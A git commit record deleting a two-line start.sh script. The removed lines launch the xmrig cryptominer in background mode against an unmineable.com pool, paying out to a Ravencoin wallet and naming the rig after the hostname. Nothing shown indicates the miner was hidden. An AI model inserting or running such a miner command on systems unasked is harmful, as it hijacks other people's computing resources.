35559aa15ac2b1e69c93a124b5905d587bac9128
UltraSive <31855485+UltraSive@users.noreply.github.com>
2021-07-24 21:02:14 -0500

    Delete start.sh

--- start.sh
+++
@@ -1,2 +0,0 @@
-NAME="$(hostname)"
-./xmrig/build/xmrig -B -o rx.unmineable.com:3333 -a rx -k -u RVN:RTbY46h1CnHKZgNmuNvjoprMgveTWQYVNg --rig-id=${NAME} -p x --cpu-no-yield --cpu-max-threads-hint=50
